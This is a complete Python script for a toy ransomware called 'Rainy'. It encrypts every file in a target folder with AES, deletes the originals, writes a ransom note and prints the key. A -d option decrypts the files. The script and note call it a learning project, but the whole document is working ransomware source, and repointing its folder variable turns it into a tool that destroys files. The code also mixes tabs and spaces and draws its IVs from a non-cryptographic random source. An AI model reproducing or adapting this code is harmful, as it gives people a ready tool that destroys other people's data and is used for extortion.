#!/usr/bin/python
# -*- coding: utf-8 -*-
""" Rainy

I learnt how to enc/dec full files by chunks from here:
https://github.com/roothaxor/Ransom/blob/master/holycrypt-v0.3.py

So yeah, go check him out as well
"""

import argparse, os, binascii, random, struct, re
from Crypto.Cipher import AES

decrypt = None
targetDir = "target"
rainyName = "rain_on_me.txt"

def main():
	parser()
	if (decrypt is None):
            key = generateKey()
            encryptFiles(key)
            createRansomFile(key)
            print("Key: %s" % binascii.hexlify(key))
	else:
            decryptFiles(decrypt)



def generateKey():
        key = os.urandom(16)
	return key

def encryptFiles(key):
	print("Encrypting files")
        filenames= os.listdir (targetDir)
        for filename in filenames:
            if os.path.basename(filename).endswith(".rain"):
                continue
            else:
                path = targetDir + "/" + filename
                encryptFile(key, path)
                os.remove(path)
	return

def encryptFile(key,file):
        chunkSize = 64 * 1024
	outputFile = os.path.join(os.path.dirname(file),
                                  os.path.basename(file) + ".rain")
	fileSize = os.path.getsize(file)

        iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
	encryptor = AES.new(key, AES.MODE_CBC, iv)

	with open(file, 'rb') as infile:
            with open(outputFile, 'wb') as outfile:
		outfile.write(struct.pack('<Q', fileSize))
		outfile.write(iv)
                chunk = infile.read(chunkSize)
		while(len(chunk)!=0):
                    if (len(chunk) % 16 != 0):
			chunk += ' ' * (16 - len(chunk) % 16)
                    outfile.write(encryptor.encrypt(chunk))
                    chunk = infile.read(chunkSize)
	return

def decryptFiles(key):
        print("Decrypting files with key: %s" % binascii.hexlify(key))
        filenames= os.listdir (targetDir)
        for filename in filenames:
            if not os.path.basename(filename).endswith(".rain"):
                continue
            else:
                path = targetDir + "/" + filename
                decryptFile(key, path)
                os.remove(path)
        return

def decryptFile(key, file):
	chunkSize = 64 * 1024
        outputFile = os.path.join(os.path.dirname(file),
                            "unrained_" + os.path.basename(file).replace(".rain",""))

	with open(file, 'rb') as infile:
            origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
            iv = infile.read(16)
            decryptor = AES.new(key, AES.MODE_CBC, iv)

            with open(outputFile, 'wb') as outfile:
                chunk = infile.read(chunkSize)
                while(len(chunk)!=0):
                    outfile.write(decryptor.decrypt(chunk))
                    chunk = infile.read(chunkSize)
                outfile.truncate(origsize)

def createRansomFile(key):
        with open(targetDir + "/" + rainyName,'w+') as rainy:
            rainy.write('''
--------------------------------------------------------------------------
                          ♪ Don't rain on me ♪
--------------------------------------------------------------------------
           Ooooops, seems like your files have been encrypted.
              But don't worry, this is just a test project,
               I've just encrypted the '{0}' directory

               The key I've used to encrypt the files is:
                    {1}

           You can decrypt the files with ./rainy.py -d <key>
       In this case, ./rainy -d {1}

 Have fun learning about ransomware and the effects they have on systems!
--------------------------------------------------------------------------
'''.format(targetDir, binascii.hexlify(key)))
        return

def parser():
	global decrypt
	parser = argparse.ArgumentParser()

	parser.add_argument("-d","--decrypt")

	args= parser.parse_args()

        if args.decrypt:
            if not re.match("^([a-fA-F0-9]{32})$",args.decrypt):
                print("The key must be 32 bytes long and hexadecimal " +
                      "(e.g. de4db33fde4db33fde4db33fde4db33f)")
                exit()
            decrypt = binascii.unhexlify(args.decrypt)


main()
